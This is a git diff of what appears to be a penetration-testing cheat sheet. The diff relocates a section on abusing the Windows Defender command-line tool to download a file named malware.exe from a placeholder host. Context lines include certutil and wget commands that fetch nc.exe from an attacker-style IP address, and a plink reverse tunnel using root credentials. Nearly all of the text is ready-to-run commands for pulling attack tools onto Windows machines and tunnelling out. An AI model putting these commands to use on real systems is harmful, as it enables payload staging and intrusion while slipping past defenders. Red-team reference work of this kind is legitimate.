@@ -13,6 +13,14 @@ certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
 wget "http://10.10.10.10/nc.exe" outfile "c:\nc.exe"	
 ```
 
+
+# Download a file using the Windows Defender CLI Tool
+```
+C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\<version-number>\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe
+```
+C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe
+
+
 # Plink.exe
 ```
 plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.110
@@ -180,11 +188,4 @@ systemctl enable ssh
 systemctl disable ssh
 ```
 
-
-
-# Download a file using the Windows Defender CLI Tool
-```
-C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\<version-number>\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe
-```
-C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe
 
